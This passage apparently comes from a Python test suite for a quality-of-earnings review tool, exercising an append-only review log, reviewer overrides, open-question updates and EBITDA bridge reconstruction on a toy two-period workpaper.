"""Tests for qoe.review_store (review log, final amounts, bridge rebuild) and the
pure helpers in qoe.ui. Fixtures are small in-memory workpapers; no deal data."""

from __future__ import annotations

import io
import json
import re
import sys
import types
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

import pytest

from qoe.money import D, dsum, fmt, period_map
from qoe.review_store import (
    NO_ENTRY_TOKEN,
    STATUS_AGREED,
    STATUS_OVERRIDDEN,
    STATUS_UNREVIEWED,
    ConflictError,
    DecisionError,
    QuestionLogEntry,
    ReviewStore,
    amount_problem,
    append_timing,
    apply_question_updates,
    apply_reviews,
    bridge_ties,
    check_bridge_identity,
    corrections_summary,
    decision_is_override,
    decision_is_stale,
    decision_problems,
    decision_token,
    encode_question_update,
    final_amounts,
    latest_by_adj,
    load_timing,
    make_decision,
    make_question_update,
    merge_logs,
    parse_question_update,
    question_token,
    questions_after,
    resolve_amounts,
    review_status,
    schedule_from_workpaper,
    timing_summary,
    tool_error_corrections,
)
from qoe.schemas import (
    AdjustmentAssessment,
    AdjustmentCategory,
    BridgeRow,
    CorrectionType,
    DataQualityCode,
    DataQualityIssue,
    DealFiles,
    DealMeta,
    DocLink,
    EbitdaBridge,
    EbitdaComponents,
    EvidenceQuote,
    Fact,
    Flag,
    FlagCode,
    GLEntry,
    GLLink,
    OpenQuestion,
    PeriodDef,
    QuestionStatus,
    ReconciliationResult,
    ReviewDecision,
    Severity,
    Treatment,
    Workpaper,
)

ROOT = Path(__file__).resolve().parents[1]
LABELS = ["FY2024", "FY2025"]
TS = "2026-01-15T10:00:00+00:00"


def _plain(markdown: str) -> str:
    """Text of a message the app escaped for Markdown (qoe.ui.md)."""
    return re.sub(r"\\(.)", r"\1", markdown)


# ---------------------------------------------------------------------------
# Fixture: a two-period workpaper with one adjustment per treatment
# ---------------------------------------------------------------------------


def _pm(a: str, b: str) -> dict[str, str]:
    return period_map({"FY2024": a, "FY2025": b}, LABELS)


def _assessment(adj_id, treatment, claimed, proposed, **kw) -> AdjustmentAssessment:
    return AdjustmentAssessment(
        adj_id=adj_id,
        title=kw.pop("title", f"Adjustment {adj_id}"),
        category=kw.pop("category", AdjustmentCategory.NON_RECURRING),
        claimed=claimed,
        traced_gl=kw.pop("traced_gl", claimed),
        documented=kw.pop("documented", claimed),
        proposed=proposed,
        treatment=treatment,
        **kw,
    )


def _assessments() -> list[AdjustmentAssessment]:
    return [
        _assessment("A-1", Treatment.ACCEPT, _pm("0", "100"), _pm("0", "100"), confidence="high"),
        _assessment(
            "A-2",
            Treatment.REVISE,
            _pm("0", "200"),
            _pm("0", "120"),
            traced_gl=_pm("0", "200"),
            documented=_pm("0", "150"),
            gl_links=[
                GLLink(entry_id="GL-R10", period="2025-02", amount="120.00", score=3.0, reasons=["account", "reference"], group="lit"),
                GLLink(entry_id="GL-R12", period="2025-03", amount="80.00", score=2.5, reasons=["counterparty"], group="retainer"),
                GLLink(entry_id="GL-R3", period="2024-03", amount="80.00", score=2.0, group="retainer", supports_claim=False),
            ],
            doc_links=[
                DocLink(
                    doc_id="letter.txt",
                    relation="agreement",
                    entry_ids=["GL-R12"],
                    score=2.0,
                    reasons=["counterparty"],
                    quotes=[EvidenceQuote(doc_id="letter.txt", page=1, quote="$80 per month")],
                )
            ],
            flags=[
                Flag(code=FlagCode.CONTINUING_OBLIGATION, severity=Severity.WARNING, message="Retainer continues.", entry_ids=["GL-R12"]),
                Flag(code=FlagCode.ALREADY_EXCLUDED_FROM_EBITDA, severity=Severity.CRITICAL, message="x"),
                Flag(code=FlagCode.EXCESS_GL_ACTIVITY, severity=Severity.INFO, message="y"),
                Flag(code=FlagCode.RECURRING_PATTERN, severity=Severity.WARNING, message="z", entry_ids=["GL-R12", "GL-R3"]),
            ],
            facts=[
                Fact(
                    text="Retainer of $80 per month continues.",
                    entry_ids=["GL-R12"],
                    quotes=[EvidenceQuote(doc_id="letter.txt", page=1, quote="$80 per month")],
                )
            ],
            judgment_questions=["Is the retainer part of the ongoing cost base?"],
        ),
        _assessment("A-3", Treatment.REJECT, _pm("0", "50"), _pm("0", "0")),
        _assessment(
            "A-4",
            Treatment.REQUEST_INFO,
            _pm("30", "30"),
            {},
            category=AdjustmentCategory.NORMALIZATION,
            open_questions=[
                OpenQuestion(q_id="Q-A-4-1", adj_id="A-4", text="Provide the executed agreement.", priority="high"),
                OpenQuestion(q_id="Q-A-4-2", adj_id="A-4", text="Basis for market pay?", priority="medium"),
            ],
        ),
        _assessment("A-5", Treatment.REVISE, _pm("58", "0"), _pm("58", "-40")),
    ]


def _bridge(assessments: list[AdjustmentAssessment]) -> EbitdaBridge:
    """Hand-built bridge on the tool's proposals (what run_review would save)."""
    gl = _pm("1000", "1200")
    rows = [BridgeRow(key="gl_ebitda", label="Reported EBITDA (per GL)", kind="subtotal", amounts=gl)]
    rows.append(BridgeRow(key="mgmt_reported_ebitda", label="Reported EBITDA (per management)", kind="subtotal", amounts=_pm("1000", "1175")))
    for a in assessments:
        rows.append(BridgeRow(key=f"mgmt:{a.adj_id}", label=f"{a.title} (as claimed)", kind="mgmt_adjustment", adj_id=a.adj_id, amounts=a.claimed))
    mgmt_total = {p: fmt(dsum(a.claimed[p] for a in assessments)) for p in LABELS}
    rows.append(BridgeRow(key="mgmt_total", label="Total management adjustments", kind="subtotal", amounts=mgmt_total))
    rows.append(
        BridgeRow(
            key="mgmt_adjusted_ebitda",
            label="Management adjusted EBITDA",
            kind="subtotal",
            amounts={p: fmt(D("1000" if p == "FY2024" else "1175") + D(mgmt_total[p])) for p in LABELS},
        )
    )
    included = [a.proposed for a in assessments if a.treatment != Treatment.REQUEST_INFO]
    rows.append(
        BridgeRow(
            key="diligence_adjusted_ebitda",
            label="Diligence adjusted EBITDA",
            kind="subtotal",
            amounts={p: fmt(D(gl[p]) + dsum(x[p] for x in included)) for p in LABELS},
        )
    )
    return EbitdaBridge(period_labels=LABELS, rows=rows)


def _workpaper() -> Workpaper:
    meta = DealMeta(
        deal_id="toy_deal",
        target_name="Toy Services, LLC",
        periods=[
            PeriodDef(label="FY2024", start="2024-01", end="2024-12"),
            PeriodDef(label="FY2025", start="2025-01", end="2025-12"),
        ],
        data_start="2024-01",
        data_end="2025-12",
        files=DealFiles(gl="gl/general_ledger.csv", chart_of_accounts="gl/coa.csv", monthly_pl="pl.xlsx", adjustments="adj.xlsx"),
    )
    recon = ReconciliationResult(
        items=[],
        issues=[
            DataQualityIssue(code=DataQualityCode.RECON_VARIANCE, severity=Severity.WARNING, message="Top-side", month="2025-12", account="6000", amount="25"),
            DataQualityIssue(code=DataQualityCode.DUPLICATE_GL_ENTRY, severity=Severity.CRITICAL, message="Dup", entry_ids=["GL-R40", "GL-R41"]),
        ],
        gl_ebitda={
            "FY2024": EbitdaComponents(net_income="800.00", interest="50.00", taxes="100.00", depreciation="40.00", amortization="10.00", ebitda="1000.00"),
            "FY2025": EbitdaComponents(net_income="1000.00", interest="50.00", taxes="100.00", depreciation="40.00", amortization="10.00", ebitda="1200.00"),
        },
        mgmt_reported_ebitda=_pm("1000", "1175"),
        months_compared=24,
        accounts_compared=5,
        variance_count=1,
    )
    assessments = _assessments()
    return Workpaper(
        run_id="run-1",
        tool_version="0.1.0",
        created_at=TS,
        ai_mode="rules",
        deal=meta,
        input_hashes={"gl/general_ledger.csv": "abc"},
        reconciliation=recon,
        assessments=assessments,
        bridge=_bridge(assessments),
    )


def _decision(adj_id, treatment, amounts, tool_treatment, tool_amounts, **kw) -> ReviewDecision:
    return ReviewDecision(
        adj_id=adj_id,
        reviewer=kw.pop("reviewer", "R. Senior"),
        timestamp=kw.pop("timestamp", TS),
        treatment=treatment,
        amounts=amounts,
        rationale=kw.pop("rationale", "Reviewed."),
        tool_treatment=tool_treatment,
        tool_amounts=tool_amounts,
        **kw,
    )


@pytest.fixture()
def wp() -> Workpaper:
    return _workpaper()


# ---------------------------------------------------------------------------
# ReviewStore
# ---------------------------------------------------------------------------


def test_store_missing_file_is_empty(tmp_path):
    store = ReviewStore(tmp_path / "nope" / "review_log.jsonl")
    assert store.all() == []
    assert store.latest() == {}


def test_store_append_roundtrip_one_line_per_decision(tmp_path):
    store = ReviewStore.for_workpaper_dir(tmp_path / "toy_deal")
    d1 = _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100"))
    d2 = _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"), correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    store.append(d1)
    store.append(d2)
    lines = store.path.read_text().splitlines()
    assert len(lines) == 2 and store.path.name == "review_log.jsonl"
    assert json.loads(lines[1])["correction_type"] == "JUDGMENT_DIFFERENCE"
    assert store.all() == [d1, d2]


def test_store_latest_wins_by_log_order_not_timestamp(tmp_path):
    store = ReviewStore(tmp_path / "review_log.jsonl")
    first = _decision("A-2", Treatment.REVISE, _pm("0", "120"), Treatment.REVISE, _pm("0", "120"), timestamp="2026-02-01T00:00:00+00:00")
    second = _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"), timestamp="2026-01-01T00:00:00+00:00")
    store.append(first)
    store.append(second)
    assert store.latest()["A-2"].treatment == Treatment.REJECT
    assert [d.treatment for d in store.history("A-2")] == [Treatment.REVISE, Treatment.REJECT]


def test_store_tolerates_trailing_partial_line_and_never_rewrites(tmp_path):
    store = ReviewStore(tmp_path / "review_log.jsonl")
    d1 = _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100"))
    store.append(d1)
    with open(store.path, "ab") as fh:  # simulate a crash mid-write
        fh.write(b'{"adj_id": "A-3", "reviewer": "x", "treat')
    before = store.path.read_bytes()
    assert store.all() == [d1]
    assert store.skipped_lines == [2]

    d2 = _decision("A-3", Treatment.REJECT, _pm("0", "0"), Treatment.REJECT, _pm("0", "0"))
    store.append(d2)
    after = store.path.read_bytes()
    assert after.startswith(before)  # history untouched; torn line only terminated
    assert store.all() == [d1, d2]
    assert store.skipped_lines == [2]


def test_store_skips_corrupt_middle_line(tmp_path):
    store = ReviewStore(tmp_path / "review_log.jsonl")
    d1 = _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100"))
    store.append(d1)
    with open(store.path, "a") as fh:
        fh.write('{"not": "a decision"}\n\n')
    store.append(d1)
    assert store.all() == [d1, d1]
    assert store.skipped_lines == [2]


# ---------------------------------------------------------------------------
# final_amounts
# ---------------------------------------------------------------------------


def test_final_amounts_unreviewed_uses_tool_proposal(wp):
    finals = final_amounts(wp, {})
    assert finals["A-1"] == _pm("0", "100")
    assert finals["A-2"] == _pm("0", "120")
    assert finals["A-3"] == _pm("0", "0")
    assert finals["A-4"] == {}  # tool REQUEST_INFO -> pending
    assert finals["A-5"] == _pm("58", "-40")


def test_final_amounts_reviewed_all_treatments(wp):
    reviews = {
        "A-1": _decision("A-1", Treatment.REVISE, {"FY2025": "90"}, Treatment.ACCEPT, _pm("0", "100")),  # missing label -> 0.00
        "A-2": _decision("A-2", Treatment.ACCEPT, _pm("0", "200"), Treatment.REVISE, _pm("0", "120")),
        "A-3": _decision("A-3", Treatment.REJECT, {}, Treatment.REJECT, _pm("0", "0")),
        "A-4": _decision("A-4", Treatment.REVISE, _pm("30", "0"), Treatment.REQUEST_INFO, {}),
        "A-5": _decision("A-5", Treatment.REQUEST_INFO, {}, Treatment.REVISE, _pm("58", "-40")),
    }
    finals = final_amounts(wp, reviews)
    assert finals["A-1"] == {"FY2024": "0.00", "FY2025": "90.00"}
    assert finals["A-2"] == _pm("0", "200")
    assert finals["A-3"] == _pm("0", "0")  # rejected is included at zero, not pending
    assert finals["A-4"] == _pm("30", "0")
    assert finals["A-5"] == {}  # reviewer asked for information -> pending


def test_final_amounts_accepts_log_list_latest_wins(wp):
    log = [
        _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120")),
        _decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120")),
    ]
    assert final_amounts(wp, log)["A-2"] == _pm("0", "150")


# ---------------------------------------------------------------------------
# apply_reviews / bridge
# ---------------------------------------------------------------------------


def test_check_bridge_identity_detects_stale_bridge(wp):
    assert bridge_ties(check_bridge_identity(wp))
    stale = wp.model_copy(deep=True)
    stale.reviews = [_decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120"))]
    diffs = check_bridge_identity(stale)  # bridge not rebuilt: off by the revision
    assert diffs == {"FY2024": "0.00", "FY2025": "-30.00"}
    assert not bridge_ties(diffs)


def test_schedule_from_workpaper_reconstructs_bridge_inputs(wp):
    sched = schedule_from_workpaper(wp)
    assert sched.period_labels == LABELS
    assert sched.reported_ebitda == _pm("1000", "1175")
    assert [c.adj_id for c in sched.adjustments] == ["A-1", "A-2", "A-3", "A-4", "A-5"]
    assert sched.adjustments[3].amounts == _pm("30", "30")
    assert sched.adjustments[3].category == AdjustmentCategory.NORMALIZATION
    assert sched.total_adjustments == _pm("88", "380")
    assert sched.adjusted_ebitda == _pm("1088", "1555")


def test_apply_reviews_passes_finals_to_bridge_and_does_not_mutate(wp, monkeypatch):
    captured = {}

    def fake_build_bridge(pkg_or_meta, recon, schedule, assessments, final_amounts=None):
        captured.update(meta=pkg_or_meta, schedule=schedule, assessments=assessments, finals=final_amounts)
        return EbitdaBridge(period_labels=LABELS, rows=[BridgeRow(key="rebuilt", label="x", kind="memo", amounts={})])

    monkeypatch.setitem(sys.modules, "qoe.bridge", types.SimpleNamespace(build_bridge=fake_build_bridge))
    log = [
        _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, question_updates={"Q-A-4-1": "ANSWERED: Sent 3/1"}),
        _decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120")),
    ]
    out = apply_reviews(wp, log)

    assert out.reviews == log
    assert out.bridge.rows[0].key == "rebuilt"
    assert captured["meta"] == wp.deal
    assert captured["finals"]["A-2"] == _pm("0", "150")
    assert captured["finals"]["A-4"] == {}
    assert captured["schedule"].reported_ebitda == _pm("1000", "1175")
    q = next(q for a in out.assessments for q in a.open_questions if q.q_id == "Q-A-4-1")
    assert (q.status, q.response) == (QuestionStatus.ANSWERED, "Sent 3/1")
    # The input workpaper is untouched.
    assert wp.reviews == []
    assert wp.bridge.rows[0].key == "gl_ebitda"
    assert all(q.status == QuestionStatus.OPEN for a in wp.assessments for q in a.open_questions)

    explicit = schedule_from_workpaper(wp).model_copy(update={"source_file": "real.xlsx"})
    apply_reviews(wp, log, schedule=explicit)
    assert captured["schedule"].source_file == "real.xlsx"


def test_apply_reviews_bridge_identity_with_real_bridge(wp):
    pytest.importorskip("qoe.bridge")
    log = [
        _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")),
        _decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120"), correction_type=CorrectionType.JUDGMENT_DIFFERENCE),
        _decision("A-4", Treatment.REVISE, _pm("30", "0"), Treatment.REQUEST_INFO, {}, correction_type=CorrectionType.NEW_INFORMATION),
        _decision("A-5", Treatment.REQUEST_INFO, {}, Treatment.REVISE, _pm("58", "-40"), correction_type=CorrectionType.JUDGMENT_DIFFERENCE),
    ]
    out = apply_reviews(wp, log)
    rows = {r.key: r for r in out.bridge.rows}
    finals = final_amounts(out, latest_by_adj(log))
    for p in LABELS:
        expected = D(rows["gl_ebitda"].amounts[p]) + dsum(f[p] for f in finals.values() if f)
        assert D(rows["diligence_adjusted_ebitda"].amounts[p]) == expected
        for a in wp.assessments:  # management rows carry the claim as presented
            assert D(rows[f"mgmt:{a.adj_id}"].amounts[p]) == D(a.claimed[p])
    assert bridge_ties(check_bridge_identity(out))
    # FY2025: 1200 + A-1 100 + A-2 150 + A-3 0 + A-4 0 (A-5 pending)
    assert D(rows["diligence_adjusted_ebitda"].amounts["FY2025"]) == D("1450")


# ---------------------------------------------------------------------------
# Diligence-identified items (SPEC §5.7) and the stored schedule
# ---------------------------------------------------------------------------


def _diligence_item(**kw) -> AdjustmentAssessment:
    return _assessment(
        "D-1",
        kw.pop("treatment", Treatment.REVISE),
        _pm("0", "0"),
        kw.pop("proposed", _pm("0", "18400")),
        title="Reverse duplicate premium posting",
        category=AdjustmentCategory.OTHER,
        source="diligence",
        description="Premium installment CRI-0507 is posted twice; the P&L carries both.",
        gl_accounts=["6200"],
        support_refs=["9.4 Premium notice.pdf"],
        gl_links=[
            GLLink(entry_id="GL-R40", period="2025-05", amount="18400.00", score=5.0, supports_claim=False),
            GLLink(entry_id="GL-R41", period="2025-05", amount="18400.00", score=5.0),
        ],
        open_questions=[OpenQuestion(q_id="Q-D-1-1", adj_id="D-1", text="Was the installment paid twice?")],
        **kw,
    )


def _wp_with_diligence(store_schedule: bool = False) -> Workpaper:
    """A run with one diligence-identified item, bridged the way the engine does it."""
    build_bridge = pytest.importorskip("qoe.bridge").build_bridge
    wp = _workpaper()
    wp.assessments.append(_diligence_item())
    sched = schedule_from_workpaper(wp)
    bridge = build_bridge(wp.deal, wp.reconciliation, sched, wp.assessments)
    return wp.model_copy(update={"bridge": bridge, "schedule": sched if store_schedule else None})


def test_schedule_from_workpaper_leaves_out_diligence_items():
    wp = _workpaper()
    wp.assessments[1] = wp.assessments[1].model_copy(
        update={"description": "Dawson litigation.", "gl_accounts": ["6400"], "support_refs": ["DR 4.2"]}
    )
    wp.assessments.append(_diligence_item())
    sched = schedule_from_workpaper(wp)
    assert [c.adj_id for c in sched.adjustments] == ["A-1", "A-2", "A-3", "A-4", "A-5"]
    a2 = sched.adjustments[1]
    assert (a2.description, a2.gl_accounts, a2.support_refs) == ("Dawson litigation.", ["6400"], ["DR 4.2"])


def test_apply_reviews_prefers_explicit_then_stored_schedule(monkeypatch):
    captured = {}

    def fake_build_bridge(pkg_or_meta, recon, schedule, assessments, final_amounts=None):
        captured.update(schedule=schedule, assessments=assessments, finals=final_amounts)
        return EbitdaBridge(period_labels=LABELS, rows=[])

    monkeypatch.setitem(sys.modules, "qoe.bridge", types.SimpleNamespace(build_bridge=fake_build_bridge))
    wp = _workpaper()
    wp.assessments.append(_diligence_item())
    stored = schedule_from_workpaper(wp).model_copy(update={"source_file": "adjustments/schedule.xlsx"})
    explicit = stored.model_copy(update={"source_file": "from the package"})

    apply_reviews(wp, [])
    assert captured["schedule"].source_file == "(reconstructed from workpaper)"
    assert "D-1" not in [c.adj_id for c in captured["schedule"].adjustments]
    apply_reviews(wp.model_copy(update={"schedule": stored}), [])
    assert captured["schedule"].source_file == "adjustments/schedule.xlsx"
    apply_reviews(wp.model_copy(update={"schedule": stored}), [], schedule=explicit)
    assert captured["schedule"].source_file == "from the package"
    # The diligence item reaches the bridge through the assessments, with its final amount.
    assert [a.adj_id for a in captured["assessments"]][-1] == "D-1"
    assert captured["finals"]["D-1"] == _pm("0", "18400")


def test_diligence_item_final_amounts_follow_management_rules():
    wp = _workpaper()
    wp.assessments.append(_diligence_item())
    d1 = wp.assessments[-1]
    assert final_amounts(wp, {})["D-1"] == _pm("0", "18400")  # unreviewed: the tool's proposal
    kw = dict(rationale="Paid once; the second posting is an AP error.", reviewer="Ann", labels=LABELS)
    agree = make_decision(d1, treatment=Treatment.REVISE, amounts=_pm("0", "18400"), timestamp=TS, **kw)
    assert not decision_is_override(agree) and agree.tool_amounts == _pm("0", "18400")
    assert review_status(d1, agree) == STATUS_AGREED
    half = make_decision(d1, treatment=Treatment.REVISE, amounts={"FY2025": "9200"},
                         correction_type=CorrectionType.JUDGMENT_DIFFERENCE, **kw)
    assert final_amounts(wp, [agree, half])["D-1"] == _pm("0", "9200")
    # Accept on a diligence item carries the tool's proposal (management claimed nothing) and
    # agrees with the tool; Reject carries zero.
    accept = make_decision(d1, treatment=Treatment.ACCEPT, amounts={}, **kw)
    assert final_amounts(wp, [accept])["D-1"] == _pm("0", "18400")
    reject = make_decision(d1, treatment=Treatment.REJECT, amounts={}, correction_type=CorrectionType.JUDGMENT_DIFFERENCE, **kw)
    assert final_amounts(wp, [reject])["D-1"] == _pm("0", "0")
    info = make_decision(d1, treatment=Treatment.REQUEST_INFO, amounts={}, correction_type=CorrectionType.NEW_INFORMATION, **kw)
    assert final_amounts(wp, [info])["D-1"] == {}


def test_apply_reviews_bridge_identity_includes_diligence_items():
    for stored in (False, True):
        wp = _wp_with_diligence(store_schedule=stored)
        rows = {r.key: r for r in wp.bridge.rows}
        assert D(rows["dil:D-1"].amounts["FY2025"]) == D("18400")
        assert bridge_ties(check_bridge_identity(wp))
        # FY2025: 1200 + A-1 100 + A-2 120 + A-3 0 + A-5 (40) + D-1 18,400 (A-4 pending)
        assert D(rows["diligence_adjusted_ebitda"].amounts["FY2025"]) == D("19780")

        log = [
            _decision("D-1", Treatment.REVISE, _pm("0", "9200"), Treatment.REVISE, _pm("0", "18400"),
                      correction_type=CorrectionType.JUDGMENT_DIFFERENCE, question_updates={"Q-D-1-1": "ANSWERED: once"}),
            _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"),
                      correction_type=CorrectionType.JUDGMENT_DIFFERENCE),
        ]
        out = apply_reviews(wp, log)
        rows = {r.key: r for r in out.bridge.rows}
        assert D(rows["dil:D-1"].amounts["FY2025"]) == D("9200")
        assert bridge_ties(check_bridge_identity(out))
        assert D(rows["diligence_adjusted_ebitda"].amounts["FY2025"]) == D("19780") - D("9200") - D("120")
        # Management rows still carry the claims as presented, whichever schedule was used.
        for a in wp.assessments[:5]:
            assert rows[f"mgmt:{a.adj_id}"].amounts == a.claimed
        q = next(q for a in out.assessments for q in a.open_questions if q.q_id == "Q-D-1-1")
        assert (q.status, q.response) == (QuestionStatus.ANSWERED, "once")
        # Reverting to the tool's proposal restores the original bridge.
        back = apply_reviews(out, [*log, _decision("D-1", Treatment.REVISE, _pm("0", "18400"), Treatment.REVISE, _pm("0", "18400"))])
        assert {r.key: r.amounts for r in back.bridge.rows}["dil:D-1"] == {r.key: r.amounts for r in wp.bridge.rows}["dil:D-1"]


# ---------------------------------------------------------------------------
# Question updates
# ---------------------------------------------------------------------------


def test_parse_and_encode_question_update():
    assert parse_question_update("answered") == (QuestionStatus.ANSWERED, None)
    assert parse_question_update("Closed: resolved on call") == (QuestionStatus.CLOSED, "resolved on call")
    assert parse_question_update("ANSWERED:") == (QuestionStatus.ANSWERED, "")
    assert parse_question_update("Per CFO: insurer paid") == (None, "Per CFO: insurer paid")
    assert encode_question_update(QuestionStatus.ANSWERED, "  Paid 2/3 ") == "ANSWERED: Paid 2/3"
    assert encode_question_update(QuestionStatus.CLOSED) == "CLOSED"
    status, response = parse_question_update(encode_question_update(QuestionStatus.OPEN, "a: b"))
    assert (status, response) == (QuestionStatus.OPEN, "a: b")


def test_question_updates_are_cumulative_in_log_order(wp):
    assessments = [a.model_copy(deep=True) for a in wp.assessments]
    log = [
        _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, question_updates={"Q-A-4-1": "ANSWERED: Insurer paid", "Q-A-4-2": "CLOSED"}),
        _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, question_updates={"Q-A-4-2": "OPEN"}),
        _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100"), question_updates={"Q-A-4-1": "Follow-up requested", "Q-X-9": "CLOSED"}),
    ]
    unknown = apply_question_updates(assessments, log)
    qs = {q.q_id: q for a in assessments for q in a.open_questions}
    assert (qs["Q-A-4-1"].status, qs["Q-A-4-1"].response) == (QuestionStatus.ANSWERED, "Follow-up requested")
    assert (qs["Q-A-4-2"].status, qs["Q-A-4-2"].response) == (QuestionStatus.OPEN, "")
    assert unknown == ["Q-X-9"]


def test_question_update_is_signed_by_its_author_and_never_re_signs_a_decision(wp, tmp_path):
    """ui-01: a question update used to be a copy of the latest decision, re-signed by
    whoever typed in the Reviewer box (or by the previous reviewer when it was blank)."""
    store = ReviewStore.for_workpaper_dir(tmp_path / "toy_deal")
    a4 = _by_id(wp)["A-4"]
    decision = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, reviewer="Assoc A", rationale="Need the agreement.")
    store.append(decision)
    q1 = a4.open_questions[0]
    with pytest.raises(DecisionError) as exc:
        make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Sent 3/1", reviewer="  ")
    assert exc.value.errors == ["Enter the reviewer's name."]
    assert make_question_update(q1, adj_id="A-4", status=QuestionStatus.OPEN, response="", reviewer="Manager B") is None

    entry = make_question_update(
        q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response=" Sent 3/1 ", reviewer=" Manager B ", timestamp="2026-03-01T00:00:00+00:00"
    )
    store.append_question(entry)
    assert store.question_path.name == "question_log.jsonl"
    assert (entry.kind, entry.reviewer, entry.status, entry.response) == ("update", "Manager B", QuestionStatus.ANSWERED, "Sent 3/1")
    # The decision log is untouched: Assoc A's decision is still the latest, with its own time.
    assert store.all() == [decision]
    assert store.latest()["A-4"].reviewer == "Assoc A"
    out = apply_reviews(wp, store.all(), question_log=store.questions())
    q = next(q for q in _by_id(out)["A-4"].open_questions if q.q_id == q1.q_id)
    assert (q.status, q.response) == (QuestionStatus.ANSWERED, "Sent 3/1")
    # A response-only change leaves the status; an explicit "" clears the response.
    answered = q1.model_copy(update={"status": QuestionStatus.ANSWERED, "response": "Sent 3/1"})
    only_status = make_question_update(answered, adj_id="A-4", status=QuestionStatus.CLOSED, response="Sent 3/1", reviewer="B")
    assert only_status.response is None
    cleared = make_question_update(answered, adj_id="A-4", status=QuestionStatus.ANSWERED, response="", reviewer="B")
    assert cleared.response == ""


def test_question_updates_do_not_need_a_decision(wp, tmp_path):
    """ui-15: a management answer can be logged on an unreviewed adjustment."""
    store = ReviewStore(tmp_path / "review_log.jsonl")
    q1 = _by_id(wp)["A-4"].open_questions[0]
    store.append_question(make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Insurer paid", reviewer="Ann"))
    assert store.all() == [] and not store.path.exists()
    out = apply_reviews(wp, store.all(), question_log=store.questions())
    assert out.reviews == []
    assert review_status(_by_id(out)["A-4"], None) == STATUS_UNREVIEWED
    assert final_amounts(out, {})["A-4"] == {}  # still the tool's proposal (pending)
    assert _by_id(out)["A-4"].open_questions[0].status == QuestionStatus.ANSWERED


def test_decision_and_question_logs_replay_in_time_order(wp):
    older = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, timestamp="2026-01-01T00:00:00+00:00",
                      question_updates={"Q-A-4-1": "CLOSED: from an old log"})
    newer = _decision("A-2", Treatment.REVISE, _pm("0", "120"), Treatment.REVISE, _pm("0", "120"), timestamp="2026-03-01T00:00:00+00:00",
                      question_updates={"Q-A-4-2": "CLOSED"})
    mid = QuestionLogEntry(kind="update", q_id="Q-A-4-1", adj_id="A-4", reviewer="B", timestamp="2026-02-01T00:00:00+00:00",
                           status=QuestionStatus.ANSWERED, response="Paid")
    mid2 = QuestionLogEntry(kind="update", q_id="Q-A-4-2", adj_id="A-4", reviewer="B", timestamp="2026-02-02T00:00:00+00:00",
                            status=QuestionStatus.ANSWERED)
    assert merge_logs([older, newer], [mid, mid2]) == [older, mid, mid2, newer]
    assessments = [a.model_copy(deep=True) for a in wp.assessments]
    apply_question_updates(assessments, [older, newer], [mid, mid2])
    qs = {q.q_id: q for a in assessments for q in a.open_questions}
    assert (qs["Q-A-4-1"].status, qs["Q-A-4-1"].response) == (QuestionStatus.ANSWERED, "Paid")
    assert qs["Q-A-4-2"].status == QuestionStatus.CLOSED


# ---------------------------------------------------------------------------
# Building decisions
# ---------------------------------------------------------------------------


def _by_id(wp: Workpaper) -> dict[str, AdjustmentAssessment]:
    return {a.adj_id: a for a in wp.assessments}


def test_make_decision_agreeing_needs_no_rationale(wp):
    a2 = _by_id(wp)["A-2"]
    d = make_decision(a2, treatment=Treatment.REVISE, amounts={"FY2025": "120.4"}, rationale="", reviewer=" Ann ", labels=LABELS, timestamp=TS)
    assert d.amounts == _pm("0", "120.40")
    assert d.tool_treatment == Treatment.REVISE and d.tool_amounts == _pm("0", "120")
    assert d.reviewer == "Ann" and d.timestamp == TS
    assert not decision_is_override(d)  # within the 1.00 tolerance


def test_make_decision_override_requires_rationale_and_correction_type(wp):
    a2 = _by_id(wp)["A-2"]
    with pytest.raises(DecisionError) as exc:
        make_decision(a2, treatment=Treatment.REVISE, amounts={"FY2025": "150"}, rationale=" ", reviewer="Ann", labels=LABELS)
    assert len(exc.value.errors) == 2
    d = make_decision(
        a2,
        treatment=Treatment.REVISE,
        amounts={"FY2025": "150"},
        rationale="Retainer months belong in the run-rate.",
        reviewer="Ann",
        labels=LABELS,
        correction_type=CorrectionType.JUDGMENT_DIFFERENCE,
        question_updates={"Q-A-2-1": "CLOSED"},
    )
    assert decision_is_override(d) and d.question_updates == {"Q-A-2-1": "CLOSED"}


def test_make_decision_treatment_amount_semantics(wp):
    a = _by_id(wp)
    kw = dict(rationale="Because.", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    accept = make_decision(a["A-2"], treatment=Treatment.ACCEPT, amounts={"FY2025": "999"}, **kw)
    assert accept.amounts == _pm("0", "200")  # accept carries the claim as presented
    reject = make_decision(a["A-1"], treatment=Treatment.REJECT, amounts={"FY2025": "999"}, **kw)
    assert reject.amounts == _pm("0", "0")
    with pytest.raises(DecisionError):  # A-1 has no question for management to carry the request
